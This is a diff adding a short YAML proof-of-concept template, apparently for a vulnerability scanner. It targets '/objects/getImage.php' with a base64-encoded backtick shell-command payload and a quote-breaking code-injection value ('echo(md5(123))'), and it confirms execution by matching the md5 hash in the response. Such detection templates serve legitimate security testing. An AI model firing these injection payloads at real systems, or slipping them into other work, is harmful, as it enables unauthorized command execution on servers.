@@ -1,0 +1,25 @@
+name: poc-yaml-example-com
+set:
+  referer: request.url
+  host: request.url.host
+  fileName: randomLowercase(4) + ".txt"
+  content: randomLowercase(8)
+  requestType: request.content_type
+  payload: urlencode(base64("`echo " + content + " > " + fileName + "`"))
+rules:
+  - method: PUT
+    headers:
+      Referer: '{{referer}}'
+      Domain: '{{host}}'
+    path: "/objects/getImage.php"
+    expression: "true"
+    body: |
+      {{payload}}
+    search: |
+      <input type="hidden" name="csrftoken" value="(?P<token>.+?)"
+  - method: POST
+    path: "/objects/getImage.php"
+    body: |
+      id=';echo(md5(123));//&csrftoken={{token}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b'202cb962ac59075b964b07152d234b70')
